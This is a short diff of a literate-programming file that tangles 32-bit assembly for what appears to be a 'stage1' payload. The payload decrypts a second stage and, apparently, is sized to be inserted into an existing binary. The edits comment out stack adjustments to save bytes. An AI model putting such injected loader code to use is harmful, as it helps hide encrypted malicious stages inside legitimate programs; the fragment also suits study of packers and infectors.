@@ -1364,7 +1364,7 @@ _start:
   }
 #+end_src
 :END:
-#Try to change the ~pop ebx, sub esp, 10~ -> ~sub esp, 10pop ebx~
+
 #+begin_src asm :tangle payload/x32/stage1.s :mkdirp yes
   global _start
 
@@ -1412,7 +1412,7 @@ _start:
   	pop edx
   	push edx
   				;Comment the line below. - 2 B to the insertion affect aes key....
-        	sub esp, edx
+  	;; sub esp, edx
   	;;       	mov edi, esp	 ;edi = buffer out; edx = len out;esi -> in; edx in_len
         	push edx	;[esp] (len, buffer) decrypt, (len, va) s2
         	push eax	;[esp] (va) s2, (len, buffer) decrypt, (len, va) s2
@@ -1442,8 +1442,7 @@ _start:
         	pop ebx	; (va)s2 [esp](len) c_s2, (va) s2, padding,(len,buffer) decrypt , (len, va) s2.
         	add esp, 0x10		;[esp]
         	pop edx			;(len) decrypt [esp] (buffer) decrypt, (len, va) s2
-  	;;  ;comment the line below -2 B to the insertion affect expected va ...
-        	add esp, edx ;Restore stack [esp] (len, va) s2
+  	;;  ;comment the line below -2 B to the insertion affect expected va ... add esp, edx ;Restore stack [esp] (len, va) s2
         	test eax, eax
         	jnz _exit		;Fine
 
